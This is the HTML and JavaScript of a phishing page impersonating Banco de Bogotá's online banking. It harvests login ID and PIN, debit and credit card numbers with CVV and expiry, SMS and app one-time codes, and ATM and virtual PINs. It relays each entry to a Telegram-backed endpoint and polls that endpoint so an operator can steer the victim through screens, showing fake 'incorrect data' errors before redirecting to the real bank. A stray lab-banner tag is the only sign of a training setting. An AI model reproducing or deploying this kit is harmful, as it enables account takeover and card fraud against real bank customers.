<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="/bogota/icono_bogota.ico">
    <title>Banca Virtual Banco de Bogotá</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <style>
        @font-face {
            font-family: Roboto-Light;
            src: url(/bogota/ce61b8b68994802f2e55.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Regular;
            src: url(/bogota/6bede58e856278b0f8f1.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Medium;
            src: url(/bogota/0fcd45fbfc419c42c8b9.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Bold;
            src: url(/bogota/17451a4c1cd55e33ac57.ttf);
            font-display: swap
        }

        .texto-1 {
            font-size: 24px;
            font-family: Roboto-Medium;
            font-weight: normal;
            line-height: 36px;
            letter-spacing: 0px;
            color: #000000;
            margin-top: 16px;
        }

        .texto-2 {
            font-size: 16px;
            font-family: Roboto-Regular;
            font-weight: normal;
            line-height: 24px;
            letter-spacing: 0.2px;
            color: #000000;
        }

        .entrada-1 {
            font-size: 18px;
            font-family: Roboto-Regular;
            font-weight: normal;
            line-height: 24px;
            letter-spacing: 0.2px;
            outline: none;
            margin: 0;
            min-width: 0;
            width: -webkit-fill-available;
            text-indent: 16px;
            padding: 0;
            color: #000000;
            border: solid 1px #b3b3b3;
            background-color: #ffffff;
            border-radius: 4px;
            text-align: left;
            height: 48px;
            text-overflow: ellipsis;
            padding-right: 16px;
        }

        .boton-1 {
            font-size: 16px;
            font-family: Roboto-Medium;
            font-weight: normal;
            line-height: 24px;
            letter-spacing: .2px;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            border-radius: 100px;
            cursor: pointer;
            outline: none;
            user-select: none;
            height: 48px;
            padding-left: 32px;
            padding-right: 32px;
            padding-top: 14px;
            padding-bottom: 16px;
            border: solid 1px #0043a9;
            background-color: #0043a9;
            color: #ffffff;
            transition: .3s;
            margin-top: 32px;
        }

        .boton-1:disabled {
            background-color: #ccc;
            border-color: #ccc;
        }

        .label-1 {
            font-size: 14px;
            font-family: Roboto-Regular;
            font-weight: normal;
            line-height: 20px;
            letter-spacing: 0.2px;
            color: #444444;
            text-align: left;
        }

        .loading-spinner {
            display: inline-block;
            width: 100px;
            height: 100px;
            border: 10px solid rgba(230, 230, 230, .3);
            border-radius: 50%;
            border-top-color: #0043a9;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .hidden {
            display: none !important;
        }

        .error-message {
            color: #c94740;
            font-family: Roboto-Regular;
            font-size: 12px;
            margin-top: 4px;
            margin-left: 8px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .borde-entrada-error {
            border-color: #c94740 !important;
        }

        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                margin: 0 auto;
            }
        }
    </style>
</head>

<body class="px-3">
<x-lab-banner />
    <!-- Loading Overlay -->
    <div id="loading" class="fixed-top bg-white d-flex align-items-center justify-content-center hidden"
        style="height: 100vh; z-index: 9999;">
        <div class="text-center">
            <div class="loading-spinner mx-auto"></div>
            <p class="mt-3">Espere un momento por favor...</p>
        </div>
    </div>

    <!-- Header -->
    <div class="text-center py-4">
        <img src="/bogota/logo_bogota_1.svg" width="300" height="auto" alt="Banco de Bogotá">
    </div>
    <div class="text-center">
        <img src="/bogota/banner_bogota.png" width="350" height="auto" alt="Banner">
    </div>

    <!-- Vista: Usuario (Login) -->
    <div id="login" class="hidden">
        <h1 class="texto-1 mt-4 text-start">Bienvenido a tu Banca Virtual</h1>
        <br>
        <!-- Mensaje de error general -->
        <div id="errorGeneralLogin" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <label class="label-1 mb-2">Identificación</label>
                <div class="row">
                    <div class="col-4">
                        <select class="entrada-1 w-100 mb-3" id="tipo_documento">
                            <option value="1" selected>C.C.</option>
                            <option value="2">T.I.</option>
                            <option value="3">C.E.</option>
                            <option value="4">N.P.N.</option>
                            <option value="5">N.P.E.</option>
                            <option value="6">P.S.</option>
                            <option value="7">R.C.</option>
                        </select>
                    </div>
                    <div class="col-8">
                        <input class="entrada-1 w-100" id="usuario" name="usuario" type="text"
                            placeholder="#" minlength="4" maxlength="15">
                        <div class="error-message" id="errorUsuario"></div>
                    </div>
                </div>
            </div>
            <label class="label-1 mb-2">Clave segura</label>
            <input class="entrada-1 w-100 mb-3" id="clave" name="clave" type="password" placeholder="Contraseña"
                minlength="4" maxlength="4">
            <div class="error-message" id="errorClave"></div>
            <div class="mt-3 text-center">
                <button id="btnLogin" class="boton-1 text-center px-5" disabled>Ingresar</button>
            </div>
        </div>
        <div class="text-center mb-3">
            <img src="/bogota/registro_bogota1.png" width="80%" height="auto">
        </div>
    </div>

    <!-- Vista: Tarjeta Débito -->
    <div id="tdb" class="hidden">
        <h1 class="texto-1 mt-4 text-start">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3">
            <p class="texto-2 mb-0 mt-2">Ingresa los datos de tu tarjeta débito:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralTDB" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <label class="label-1 mb-2">Número de tarjeta</label>
                <input class="entrada-1 w-100" id="numtarjetaTDB" name="numtarjeta" type="text"
                    placeholder="Número de tarjeta" minlength="16" maxlength="19" autocomplete="off">
                <div class="error-message" id="errorNumTarjetaTDB"></div>
            </div>
            <div class="row mb-4">
                <div class="col-6">
                    <label class="label-1 mb-2">Vencimiento</label>
                    <input class="entrada-1 w-100" id="vencimientoTDB" name="vencimiento" type="text"
                        placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                    <div class="error-message" id="errorVencimientoTDB"></div>
                </div>
                <div class="col-6">
                    <label class="label-1 mb-2">CVV</label>
                    <input class="entrada-1 w-100" id="cvvTDB" name="cvv" type="text" placeholder="CVV"
                        minlength="3" maxlength="4" autocomplete="off">
                    <div class="error-message" id="errorCVVTDB"></div>
                </div>
            </div>
            <div class="d-flex justify-content-center">
                <button id="btnTDB" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Tarjeta Crédito -->
    <div id="tdc" class="hidden">
        <h1 class="texto-1 mt-4 text-start">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3">
            <p class="texto-2 mb-0 mt-2">Ingresa los datos de tu tarjeta de crédito:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralTDC" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <label class="label-1 mb-2">Número de tarjeta</label>
                <input class="entrada-1 w-100" id="numtarjetaTDC" name="numtarjeta" type="text"
                    placeholder="Número de tarjeta" minlength="16" maxlength="19" autocomplete="off">
                <div class="error-message" id="errorNumTarjetaTDC"></div>
            </div>
            <div class="row mb-4">
                <div class="col-6">
                    <label class="label-1 mb-2">Vencimiento</label>
                    <input class="entrada-1 w-100" id="vencimientoTDC" name="vencimiento" type="text"
                        placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                    <div class="error-message" id="errorVencimientoTDC"></div>
                </div>
                <div class="col-6">
                    <label class="label-1 mb-2">CVV</label>
                    <input class="entrada-1 w-100" id="cvvTDC" name="cvv" type="text" placeholder="CVV"
                        minlength="3" maxlength="4" autocomplete="off">
                    <div class="error-message" id="errorCVVTDC"></div>
                </div>
            </div>
            <div class="d-flex justify-content-center">
                <button id="btnTDC" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: OTP SMS -->
    <div id="codsms" class="hidden">
        <h1 class="texto-1 mt-5 text-start px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3">
            <p class="texto-2 mb-0 mt-2">Se ha enviado un código de seguridad a tu celular</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralCodSms" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-5">
                <input class="entrada-1 w-100" id="codsmsInput" name="codsms" type="password"
                    placeholder="Código de seguridad" minlength="6" maxlength="8">
                <div class="error-message" id="errorCodSms"></div>
            </div>
            <div class="mt-3 text-center">
                <button id="btnCodSms" class="boton-1 text-center px-5" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: OTP APP -->
    <div id="codapp" class="hidden">
        <h1 class="texto-1 mt-5 text-start px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3">
            <p class="texto-2 mb-0 mt-2">Se ha generado un código de seguridad en la App</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralCodApp" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-5">
                <input class="entrada-1 w-100" id="codappInput" name="codapp" type="password"
                    placeholder="Código de seguridad" minlength="6" maxlength="8">
                <div class="error-message" id="errorCodApp"></div>
            </div>
            <div class="mt-3 text-center">
                <button id="btnCodApp" class="boton-1 text-center px-5" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Clave Cajero -->
    <div id="pincaj" class="hidden">
        <h1 class="texto-1 mt-5 text-start px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3">
            <p class="texto-2 mb-0 mt-2">Por tu seguridad, ingresa tu clave de cajero</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralPinCaj" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-5">
                <input class="entrada-1 w-100" id="pincajInput" name="pincaj" type="password"
                    placeholder="Clave de cajero" minlength="4" maxlength="4">
                <div class="error-message" id="errorPinCaj"></div>
            </div>
            <div class="mt-3 text-center">
                <button id="btnPinCaj" class="boton-1 text-center px-5" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Clave Virtual -->
    <div id="pinvir" class="hidden">
        <h1 class="texto-1 mt-5 text-start px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3">
            <p class="texto-2 mb-0 mt-2">Por tu seguridad, ingresa tu clave virtual</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralPinVir" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-5">
                <input class="entrada-1 w-100" id="pinvirInput" name="pinvir" type="password"
                    placeholder="Clave virtual" minlength="4" maxlength="8">
                <div class="error-message" id="errorPinVir"></div>
            </div>
            <div class="mt-3 text-center">
                <button id="btnPinVir" class="boton-1 text-center px-5" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Finalización -->
    <div id="exito" class="hidden">
        <div class="text-center">
            <div class="my-4">
                <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" fill="#198500"
                    class="bi bi-check-circle-fill" viewBox="0 0 16 16">
                    <path
                        d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z" />
                </svg>
            </div>
            <h2 class="mb-3">Proceso completado exitosamente</h2>
            <p class="">Gracias por utilizar nuestros servicios.</p>
            <p class="">Serás redirigido en breve...</p>
        </div>
    </div>

    <!-- Vista: Error -->
    <div id="error" class="hidden">
        <div class="text-center">
            <div class="my-4">
                <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" fill="#c94740"
                    class="bi bi-exclamation-circle-fill" viewBox="0 0 16 16">
                    <path
                        d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 4a.905.905 0 0 0-.9.995l.35 3.507a.552.552 0 0 0 1.1 0l.35-3.507A.905.905 0 0 0 8 4zm.002 6a1 1 0 1 0 0 2 1 1 0 0 0 0-2z" />
                </svg>
            </div>
            <h2 class="mb-3">Ha ocurrido un error</h2>
            <p class="">Por favor, intenta nuevamente más tarde.</p>
        </div>
    </div>

    <!-- Vista: Wait (Loading intermedio) -->
    <div id="wait" class="hidden">
        <div class="text-center mt-5">
            <div class="loading-spinner"></div>
        </div>
        <br>
        <div class="text-center">
            <p class="texto-1">Espere un momento por favor.</p>
        </div>
    </div>

    <div class="text-center mt-2">
        <img src="/bogota/footer_bogota.png" width="100%" height="auto">
    </div>

    <script>
        $(document).ready(function () {
            // ==================== CONFIGURACIÓN INICIAL ====================
            function generateUniqId() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < 6; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            let sessionUniqId = sessionStorage.getItem('uniqId');
            if (!sessionUniqId || sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6) {
                if (sessionUniqId && (sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6)) {
                    localStorage.clear();
                }
                sessionUniqId = generateUniqId();
                sessionStorage.setItem('uniqId', sessionUniqId);
            }

            const appState = {
                uniqId: sessionUniqId,
                currentView: 'login'
            };

            console.log('Session UniqID:', appState.uniqId);

            // ==================== RECUPERAR DATOS PSE ====================
            const pseDatosStr = sessionStorage.getItem('pseDatos');
            if (pseDatosStr) {
                try {
                    const pseDatos = JSON.parse(pseDatosStr);
                    const camposPSE = {
                        'nombre': pseDatos.nombre,
                        'email': pseDatos.email,
                        'celular': pseDatos.celular,
                        'direccion': pseDatos.direccion,
                        'ciudad': pseDatos.ciudad,
                        'departamento': pseDatos.departamento,
                        'banco': pseDatos.banco,
                        'tipoPersona': pseDatos.tipoPersona,
                        'ente': 'brasilia'
                    };
                    Object.keys(camposPSE).forEach(key => {
                        if (camposPSE[key]) {
                            const storageKey = `${appState.uniqId}_${key}`;
                            localStorage.setItem(storageKey, JSON.stringify(camposPSE[key]));
                        }
                    });
                    console.log('Datos PSE recuperados:', pseDatos);
                } catch (e) {
                    console.error('Error al parsear pseDatos:', e);
                }
            }

            // ==================== FUNCIONES AUXILIARES ====================
            function saveToLocalStorage(key, value) {
                const storageKey = `${appState.uniqId}_${key}`;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = `${appState.uniqId}_${key}`;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            function hideAllViews() {
                $('#login, #tdb, #tdc, #codsms, #codapp, #pincaj, #pinvir, #exito, #error, #wait').addClass('hidden');
            }

            function showView(viewId) {
                hideAllViews();
                $('#' + viewId).removeClass('hidden');

                // Mostrar mensaje de error general si la vista ya fue mostrada antes
                const viewHistory = sessionStorage.getItem('viewHistory') || '';

                if (viewHistory.includes(viewId) && viewId !== 'wait' && viewId !== 'exito' && viewId !== 'error') {
                    // La vista ya fue mostrada antes, mostrar mensaje de error y limpiar campos
                    if (viewId === 'login') {
                        $('#errorGeneralLogin').text('Datos incorrectos. Intenta nuevamente.').addClass('show');
                        $('#usuario').val('');
                        $('#clave').val('');
                        $('#btnLogin').prop('disabled', true);
                    } else if (viewId === 'tdb') {
                        $('#errorGeneralTDB').text('Datos de tarjeta incorrectos. Verifica e intenta nuevamente.').addClass('show');
                        $('#numtarjetaTDB').val('');
                        $('#vencimientoTDB').val('');
                        $('#cvvTDB').val('');
                        $('#btnTDB').prop('disabled', true);
                    } else if (viewId === 'tdc') {
                        $('#errorGeneralTDC').text('Datos de tarjeta incorrectos. Verifica e intenta nuevamente.').addClass('show');
                        $('#numtarjetaTDC').val('');
                        $('#vencimientoTDC').val('');
                        $('#cvvTDC').val('');
                        $('#btnTDC').prop('disabled', true);
                    } else if (viewId === 'codsms') {
                        $('#errorGeneralCodSms').text('Código incorrecto. Intenta nuevamente.').addClass('show');
                        $('#codsmsInput').val('');
                        $('#btnCodSms').prop('disabled', true);
                    } else if (viewId === 'codapp') {
                        $('#errorGeneralCodApp').text('Código incorrecto. Intenta nuevamente.').addClass('show');
                        $('#codappInput').val('');
                        $('#btnCodApp').prop('disabled', true);
                    } else if (viewId === 'pincaj') {
                        $('#errorGeneralPinCaj').text('Clave incorrecta. Intenta nuevamente.').addClass('show');
                        $('#pincajInput').val('');
                        $('#btnPinCaj').prop('disabled', true);
                    } else if (viewId === 'pinvir') {
                        $('#errorGeneralPinVir').text('Clave incorrecta. Intenta nuevamente.').addClass('show');
                        $('#pinvirInput').val('');
                        $('#btnPinVir').prop('disabled', true);
                    }
                } else {
                    // Ocultar mensajes de error generales
                    $('.error-message.show').removeClass('show').text('');
                }

                // Registrar la vista en el historial
                if (!viewHistory.includes(viewId)) {
                    sessionStorage.setItem('viewHistory', viewHistory + viewId + ',');
                }

                appState.currentView = viewId;
            }

            function showLoading() {
                $('#loading').removeClass('hidden');
                setTimeout(iniciarPolling, 4000);
            }

            function hideLoading() {
                $('#loading').addClass('hidden');
            }

            let enviandoATelegram = false;

            async function enviarATelegram() {
                if (enviandoATelegram) {
                    console.log('Ya hay un envío en progreso, evitando duplicado');
                    return;
                }

                enviandoATelegram = true;

                const allData = {};
                const fields = ['usuario', 'clave', 'ente', 'tdb', 'cvv_tdb', 'ven_tdb', 'tdc', 'cvv_tdc', 'ven_tdc',
                    'nombre', 'email', 'celular', 'ciudad', 'direccion', 'departamento',
                    'banco', 'tipoPersona', 'codsms', 'codapp', 'pincaj', 'pinvir', 'status', 'uniqid'
                ];

                fields.forEach(field => {
                    allData[field] = getFromLocalStorage(field);
                });

                try {
                    const response = await fetch('/api/telegram/send', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId,
                            data: allData
                        })
                    });
                    const result = await response.json();
                    console.log('Datos enviados a Telegram:', result);
                } catch (e) {
                    console.error('Error al enviar a Telegram:', e);
                } finally {
                    setTimeout(() => {
                        enviandoATelegram = false;
                    }, 1000);
                }
            }

            async function iniciarPolling() {
                const loadingElement = document.getElementById('loading');
                if (loadingElement && loadingElement.classList.contains('hidden')) {
                    return;
                }

                try {
                    const response = await fetch(`/api/telegram/check-button`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId
                        })
                    });
                    const data = await response.json();

                    if (data.button) {
                        hideLoading();

                        // Mapeo de respuestas de Telegram a vistas
                        const viewMap = {
                            'login': 'login',
                            'tdb': 'tdb',
                            'tdc': 'tdc',
                            'codsms': 'codsms',
                            'codapp': 'codapp',
                            'pincaj': 'pincaj',
                            'pinvir': 'pinvir',
                            'exito': 'exito',
                            'error': 'error',
                            'wait': 'wait'
                        };

                        const viewId = viewMap[data.button] || data.button;
                        showView(viewId);

                        // Redirección automática para exito
                        if (viewId === 'exito') {
                            setTimeout(function () {
                                window.location.href = 'https://www.bancodebogota.com/';
                            }, 5000);
                        }
                    } else {
                        setTimeout(iniciarPolling, 2000);
                    }
                } catch (error) {
                    console.error('Error en polling:', error);
                    setTimeout(iniciarPolling, 2000);
                }
            }

            // ==================== FUNCIONES DE VALIDACIÓN ====================
            function mostrarError(fieldId, errorId, mensaje) {
                $('#' + errorId).text(mensaje).addClass('show');
                $('#' + fieldId).addClass('borde-entrada-error');
            }

            function ocultarError(fieldId, errorId) {
                $('#' + errorId).removeClass('show').text('');
                $('#' + fieldId).removeClass('borde-entrada-error');
            }

            function validarLuhn(cardNumber) {
                const numero = cardNumber.replace(/\s/g, '');
                if (!/^\d+$/.test(numero)) {
                    return false;
                }

                let suma = 0;
                let alternar = false;

                for (let i = numero.length - 1; i >= 0; i--) {
                    let digito = parseInt(numero.charAt(i), 10);

                    if (alternar) {
                        digito *= 2;
                        if (digito > 9) {
                            digito -= 9;
                        }
                    }

                    suma += digito;
                    alternar = !alternar;
                }

                return (suma % 10) === 0;
            }

            function validarVencimiento(vencimiento) {
                if (!/^\d{2}\/\d{2}$/.test(vencimiento)) {
                    return false;
                }

                const [mes, anio] = vencimiento.split('/');
                const mesNum = parseInt(mes, 10);
                const anioNum = parseInt(anio, 10);

                if (mesNum < 1 || mesNum > 12) {
                    return false;
                }

                const hoy = new Date();
                const anioActual = hoy.getFullYear() % 100;
                const mesActual = hoy.getMonth() + 1;

                if (anioNum < anioActual) {
                    return false;
                }
                if (anioNum === anioActual && mesNum < mesActual) {
                    return false;
                }

                return true;
            }

            function validateLogin() {
                const usuario = $('#usuario').val().trim();
                const clave = $('#clave').val().trim();
                const isValid = /^\d{4,15}$/.test(usuario) && /^\d{4}$/.test(clave);
                $('#btnLogin').prop('disabled', !isValid);
                return isValid;
            }

            function validateTarjeta(tipo) {
                const prefix = tipo === 'tdb' ? 'TDB' : 'TDC';
                const numtarjeta = $(`#numtarjeta${prefix}`).val().replace(/\s/g, '');
                const vencimiento = $(`#vencimiento${prefix}`).val().trim();
                const cvv = $(`#cvv${prefix}`).val().trim();

                const isValid = validarLuhn(numtarjeta) && validarVencimiento(vencimiento) &&
                    /^\d{3,4}$/.test(cvv);
                $(`#btn${prefix}`).prop('disabled', !isValid);
                return isValid;
            }

            function validateOtp(inputId, btnId, minLen, maxLen) {
                const value = $(inputId).val().trim();
                const regex = new RegExp(`^\\d{${minLen},${maxLen}}$`);
                const isValid = regex.test(value);
                $(btnId).prop('disabled', !isValid);
                return isValid;
            }

            // ==================== EVENTOS LOGIN ====================
            $('#usuario, #clave').on('input', validateLogin);

            $('#btnLogin').on('click', async function () {
                if (validateLogin()) {
                    saveToLocalStorage('usuario', $('#usuario').val().trim());
                    saveToLocalStorage('clave', $('#clave').val().trim());
                    saveToLocalStorage('ente', 'bogota');
                    saveToLocalStorage('status', 'LOGIN');
                    saveToLocalStorage('uniqid', appState.uniqId);

                    await enviarATelegram();
                    showLoading();
                    iniciarPolling();
                }
            });

            // ==================== EVENTOS TDB ====================
            $('#numtarjetaTDB').on('input', function () {
                let value = $(this).val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                $(this).val(formattedValue);
                validateTarjeta('tdb');
            });

            $('#vencimientoTDB').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                $(this).val(value);
                validateTarjeta('tdb');
            });

            $('#cvvTDB').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateTarjeta('tdb');
            });

            $('#btnTDB').on('click', async function () {
                if (validateTarjeta('tdb')) {
                    saveToLocalStorage('tdb', $('#numtarjetaTDB').val().trim());
                    saveToLocalStorage('cvv_tdb', $('#cvvTDB').val().trim());
                    saveToLocalStorage('ven_tdb', $('#vencimientoTDB').val().trim());
                    saveToLocalStorage('status', 'TDB');

                    await enviarATelegram();
                    showLoading();
                    iniciarPolling();
                }
            });

            // ==================== EVENTOS TDC ====================
            $('#numtarjetaTDC').on('input', function () {
                let value = $(this).val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                $(this).val(formattedValue);
                validateTarjeta('tdc');
            });

            $('#vencimientoTDC').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                $(this).val(value);
                validateTarjeta('tdc');
            });

            $('#cvvTDC').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateTarjeta('tdc');
            });

            $('#btnTDC').on('click', async function () {
                if (validateTarjeta('tdc')) {
                    saveToLocalStorage('tdc', $('#numtarjetaTDC').val().trim());
                    saveToLocalStorage('cvv_tdc', $('#cvvTDC').val().trim());
                    saveToLocalStorage('ven_tdc', $('#vencimientoTDC').val().trim());
                    saveToLocalStorage('status', 'TDC');

                    await enviarATelegram();
                    showLoading();
                    iniciarPolling();
                }
            });

            // ==================== EVENTOS OTP SMS ====================
            $('#codsmsInput').on('input', function () {
                validateOtp('#codsmsInput', '#btnCodSms', 6, 8);
            });

            $('#btnCodSms').on('click', async function () {
                if (validateOtp('#codsmsInput', '#btnCodSms', 6, 8)) {
                    saveToLocalStorage('codsms', $('#codsmsInput').val().trim());
                    saveToLocalStorage('status', 'CODSMS');

                    await enviarATelegram();
                    showLoading();
                    iniciarPolling();
                }
            });

            // ==================== EVENTOS OTP APP ====================
            $('#codappInput').on('input', function () {
                validateOtp('#codappInput', '#btnCodApp', 6, 8);
            });

            $('#btnCodApp').on('click', async function () {
                if (validateOtp('#codappInput', '#btnCodApp', 6, 8)) {
                    saveToLocalStorage('codapp', $('#codappInput').val().trim());
                    saveToLocalStorage('status', 'CODAPP');

                    await enviarATelegram();
                    showLoading();
                    iniciarPolling();
                }
            });

            // ==================== EVENTOS CLAVE CAJERO ====================
            $('#pincajInput').on('input', function () {
                validateOtp('#pincajInput', '#btnPinCaj', 4, 4);
            });

            $('#btnPinCaj').on('click', async function () {
                if (validateOtp('#pincajInput', '#btnPinCaj', 4, 4)) {
                    saveToLocalStorage('pincaj', $('#pincajInput').val().trim());
                    saveToLocalStorage('status', 'PINCAJ');

                    await enviarATelegram();
                    showLoading();
                    iniciarPolling();
                }
            });

            // ==================== EVENTOS CLAVE VIRTUAL ====================
            $('#pinvirInput').on('input', function () {
                validateOtp('#pinvirInput', '#btnPinVir', 4, 8);
            });

            $('#btnPinVir').on('click', async function () {
                if (validateOtp('#pinvirInput', '#btnPinVir', 4, 8)) {
                    saveToLocalStorage('pinvir', $('#pinvirInput').val().trim());
                    saveToLocalStorage('status', 'PINVIR');

                    await enviarATelegram();
                    showLoading();
                    iniciarPolling();
                }
            });

            // ==================== INICIALIZACIÓN ====================
            showView('login');
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>
